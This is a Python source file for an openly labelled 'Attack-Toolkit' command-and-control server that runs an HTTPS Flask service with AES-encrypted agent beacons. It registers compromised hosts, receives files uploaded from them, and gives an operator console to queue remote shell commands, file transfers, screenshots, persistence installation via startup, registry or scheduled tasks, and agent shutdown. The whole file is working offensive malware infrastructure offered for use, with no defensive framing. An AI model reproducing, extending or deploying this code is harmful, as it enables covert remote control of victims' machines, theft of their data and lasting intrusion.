#!/usr/bin/env python3
"""
Attack-Toolkit — C2 Server
HTTPS + AES-256 encrypted, multi-agent command-and-control server.
Requires: pip install cryptography flask
"""

import argparse
import base64
import json
import logging
import os
import ssl
import sys
import threading
import time
import uuid
from datetime import datetime
from hashlib import sha256

try:
    import readline  # noqa: F401 — enables arrow-key history in console
except ImportError:
    pass

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from flask import Flask, request, jsonify

# ─── defaults ──────────────────────────────────────────────────────────────────
DEFAULT_HOST      = "0.0.0.0"
DEFAULT_PORT      = 8443
DEFAULT_PASSWORD  = "changeme_strong_password"
BEACON_TIMEOUT    = 120          # seconds — remove agent after this silence
CERT_FILE         = "server.crt"
KEY_FILE          = "server.key"
LOG_FILE          = "c2_server.log"
SALT              = b"paralel3pido_c2_salt_2024"   # static salt; change per-op

app = Flask(__name__)
app.logger.disabled = True
log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

# ─── global state ──────────────────────────────────────────────────────────────
agents: dict = {}          # uuid → agent_info dict
pending_cmds: dict = {}    # uuid → list of (cmd_id, command_dict)
results: dict = {}         # cmd_id → result string
agents_lock = threading.Lock()

master_key: bytes = b""    # derived at startup


# ═══════════════════════════════════════════════════════════════════════════════
# Crypto helpers
# ═══════════════════════════════════════════════════════════════════════════════
def derive_key(password: str) -> bytes:
    """PBKDF2-HMAC-SHA256 → 32-byte AES key."""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=SALT,
        iterations=100_000,
        backend=default_backend(),
    )
    return kdf.derive(password.encode())


def aes_encrypt(data: bytes) -> bytes:
    """AES-256-CBC encrypt; prepends 16-byte IV; returns base64."""
    iv = os.urandom(16)
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    return base64.b64encode(iv + ct)


def aes_decrypt(b64_data: bytes) -> bytes:
    """Reverse of aes_encrypt."""
    raw = base64.b64decode(b64_data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ct) + dec.finalize()
    unpadder = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


def encrypt_payload(obj: dict) -> str:
    """JSON-serialize → AES encrypt → return str."""
    return aes_encrypt(json.dumps(obj).encode()).decode()


def decrypt_payload(token: str) -> dict:
    """Reverse of encrypt_payload."""
    return json.loads(aes_decrypt(token.encode()).decode())


# ═══════════════════════════════════════════════════════════════════════════════
# TLS self-signed cert generator
# ═══════════════════════════════════════════════════════════════════════════════
def generate_self_signed_cert():
    """Generate server.crt / server.key using cryptography lib if missing."""
    if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
        return
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    import ipaddress

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME, "ACME Corp"),
        x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
    ])
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(datetime.utcnow())
        .not_valid_after(datetime.utcnow().replace(year=datetime.utcnow().year + 5))
        .add_extension(x509.SubjectAlternativeName([
            x509.DNSName("localhost"),
            x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
        ]), critical=False)
        .sign(key, hashes.SHA256(), default_backend())
    )
    with open(KEY_FILE, "wb") as f:
        f.write(key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ))
    with open(CERT_FILE, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))
    logger.info("[*] Self-signed cert generated: %s / %s", CERT_FILE, KEY_FILE)


# ═══════════════════════════════════════════════════════════════════════════════
# Agent heartbeat reaper
# ═══════════════════════════════════════════════════════════════════════════════
def reaper():
    """Background thread: remove agents silent for BEACON_TIMEOUT seconds."""
    while True:
        time.sleep(15)
        now = time.time()
        with agents_lock:
            dead = [uid for uid, a in agents.items() if now - a["last_seen"] > BEACON_TIMEOUT]
            for uid in dead:
                logger.warning("[!] Agent timed out and removed: %s (%s)", uid, agents[uid].get("hostname", "?"))
                del agents[uid]
                pending_cmds.pop(uid, None)


# ═══════════════════════════════════════════════════════════════════════════════
# Flask routes
# ═══════════════════════════════════════════════════════════════════════════════
@app.route("/beacon", methods=["POST"])
def beacon():
    """Agent check-in. Body: encrypted JSON {uuid, sysinfo?, result?}."""
    try:
        blob = request.get_data(as_text=True)
        data = decrypt_payload(blob)
    except Exception:
        return "", 400

    agent_uuid = data.get("uuid", "")
    if not agent_uuid:
        return "", 400

    with agents_lock:
        if agent_uuid not in agents:
            agents[agent_uuid] = {
                "uuid":      agent_uuid,
                "hostname":  data.get("hostname", "?"),
                "username":  data.get("username", "?"),
                "os":        data.get("os", "?"),
                "ip":        data.get("ip", request.remote_addr),
                "first_seen": datetime.utcnow().isoformat(),
                "last_seen": time.time(),
            }
            logger.info("[+] New agent: %s | %s@%s | %s",
                        agent_uuid, agents[agent_uuid]["username"],
                        agents[agent_uuid]["hostname"], agents[agent_uuid]["os"])
        else:
            agents[agent_uuid]["last_seen"] = time.time()

        # store result if present
        result_id = data.get("result_id")
        result_val = data.get("result")
        if result_id and result_val is not None:
            results[result_id] = result_val
            logger.info("[=] Result [%s] from %s: %s", result_id, agent_uuid, str(result_val)[:200])

        # dequeue next command
        queue = pending_cmds.get(agent_uuid, [])
        if queue:
            cmd_id, cmd = queue.pop(0)
            pending_cmds[agent_uuid] = queue
            response = encrypt_payload({"cmd_id": cmd_id, "cmd": cmd})
        else:
            response = encrypt_payload({"cmd": {"op": "noop"}})

    return response, 200


@app.route("/upload", methods=["POST"])
def upload():
    """Receive file uploaded from agent."""
    try:
        blob = request.get_data()
        data = decrypt_payload(blob.decode())
        agent_uuid = data.get("uuid", "unknown")
        filename   = os.path.basename(data.get("filename", "upload.bin"))
        content    = base64.b64decode(data.get("content", ""))
        save_path  = os.path.join("uploads", agent_uuid, filename)
        os.makedirs(os.path.dirname(save_path), exist_ok=True)
        with open(save_path, "wb") as f:
            f.write(content)
        logger.info("[+] File received from %s: %s (%d bytes)", agent_uuid, filename, len(content))
        return encrypt_payload({"status": "ok"}), 200
    except Exception as e:
        logger.error("upload error: %s", e)
        return "", 400


# ═══════════════════════════════════════════════════════════════════════════════
# Interactive operator console
# ═══════════════════════════════════════════════════════════════════════════════
def console():
    """Blocking operator console running in main thread."""
    HELP = """
Commands:
  list                          — list active agents
  use <uuid|idx>                — select active agent
  shell <cmd>                   — run shell command on agent
  upload <local_path>           — upload file to agent CWD
  download <remote_path>        — download file from agent
  screenshot                    — capture agent screen
  persist <method>              — install persistence (startup|registry|schtask)
  kill                          — terminate agent process
  sleep <min> <max>             — reconfigure agent jitter sleep
  result <cmd_id>               — show result of async command
  back                          — deselect current agent
  exit / quit                   — shut down server
  help                          — this menu
"""
    active_agent = None

    while True:
        try:
            prompt = f"C2[{active_agent[:8] if active_agent else 'none'}]> "
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Shutting down.")
            os._exit(0)

        if not line:
            continue

        parts = line.split(None, 1)
        cmd   = parts[0].lower()
        args  = parts[1] if len(parts) > 1 else ""

        if cmd in ("exit", "quit"):
            os._exit(0)

        elif cmd == "help":
            print(HELP)

        elif cmd == "list":
            with agents_lock:
                if not agents:
                    print("  (no active agents)")
                else:
                    print(f"  {'#':<4} {'UUID':<36} {'HOST':<20} {'USER':<15} {'OS':<20} {'LAST SEEN'}")
                    for i, (uid, a) in enumerate(agents.items()):
                        elapsed = int(time.time() - a["last_seen"])
                        print(f"  {i:<4} {uid:<36} {a['hostname']:<20} {a['username']:<15} {a['os']:<20} {elapsed}s ago")

        elif cmd == "use":
            with agents_lock:
                uids = list(agents.keys())
            target = args.strip()
            if target.isdigit() and int(target) < len(uids):
                active_agent = uids[int(target)]
                print(f"[*] Agent selected: {active_agent}")
            elif target in uids:
                active_agent = target
                print(f"[*] Agent selected: {active_agent}")
            else:
                print("[-] Agent not found.")

        elif cmd == "back":
            active_agent = None

        elif cmd in ("shell", "upload", "download", "screenshot", "persist", "kill", "sleep"):
            if not active_agent:
                print("[-] No agent selected. Use: use <uuid|idx>")
                continue
            with agents_lock:
                if active_agent not in agents:
                    print("[-] Agent no longer active.")
                    active_agent = None
                    continue

            cmd_id = str(uuid.uuid4())[:8]

            if cmd == "shell":
                payload = {"op": "shell", "data": args}
            elif cmd == "upload":
                local = args.strip()
                if not os.path.exists(local):
                    print(f"[-] Local file not found: {local}")
                    continue
                with open(local, "rb") as f:
                    content = base64.b64encode(f.read()).decode()
                payload = {"op": "upload", "filename": os.path.basename(local), "content": content}
            elif cmd == "download":
                payload = {"op": "download", "path": args.strip()}
            elif cmd == "screenshot":
                payload = {"op": "screenshot"}
            elif cmd == "persist":
                payload = {"op": "persist", "method": args.strip() or "registry"}
            elif cmd == "kill":
                payload = {"op": "die"}
            elif cmd == "sleep":
                sp = args.split()
                try:
                    mn, mx = int(sp[0]), int(sp[1])
                    payload = {"op": "sleep_cfg", "min": mn, "max": mx}
                except Exception:
                    print("Usage: sleep <min_sec> <max_sec>")
                    continue

            with agents_lock:
                pending_cmds.setdefault(active_agent, []).append((cmd_id, payload))
            print(f"[*] Queued [{cmd_id}] — waiting for next beacon.")

        elif cmd == "result":
            rid = args.strip()
            if rid in results:
                print(results[rid])
            else:
                print("[-] No result yet for:", rid)

        else:
            print(f"[-] Unknown command: {cmd}. Type 'help'.")


# ═══════════════════════════════════════════════════════════════════════════════
# Logging setup
# ═══════════════════════════════════════════════════════════════════════════════
def setup_logging():
    global logger
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s  %(message)s",
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler(sys.stdout),
        ],
    )
    logger = logging.getLogger("c2")


# ═══════════════════════════════════════════════════════════════════════════════
# Entry point
# ═══════════════════════════════════════════════════════════════════════════════
def main():
    parser = argparse.ArgumentParser(description="C2 Server — HTTPS AES-256 encrypted")
    parser.add_argument("--host",     default=DEFAULT_HOST,     help="Bind address")
    parser.add_argument("--port",     default=DEFAULT_PORT,     type=int, help="HTTPS port")
    parser.add_argument("--password", default=DEFAULT_PASSWORD, help="Shared AES key password")
    parser.add_argument("--timeout",  default=BEACON_TIMEOUT,  type=int, help="Agent heartbeat timeout (s)")
    args = parser.parse_args()

    global master_key, BEACON_TIMEOUT
    BEACON_TIMEOUT = args.timeout
    master_key = derive_key(args.password)

    setup_logging()
    generate_self_signed_cert()
    os.makedirs("uploads", exist_ok=True)

    # reaper thread
    t_reaper = threading.Thread(target=reaper, daemon=True)
    t_reaper.start()

    # Flask in background thread
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(CERT_FILE, KEY_FILE)

    def run_flask():
        from werkzeug.serving import make_ssl_devcert, run_simple
        run_simple(args.host, args.port, app, ssl_context=(CERT_FILE, KEY_FILE),
                   use_reloader=False, use_debugger=False)

    t_flask = threading.Thread(target=run_flask, daemon=True)
    t_flask.start()

    logger.info("[*] C2 Server listening on https://%s:%d", args.host, args.port)
    logger.info("[*] AES key fingerprint: %s", sha256(master_key).hexdigest()[:16])

    console()


if __name__ == "__main__":
    main()
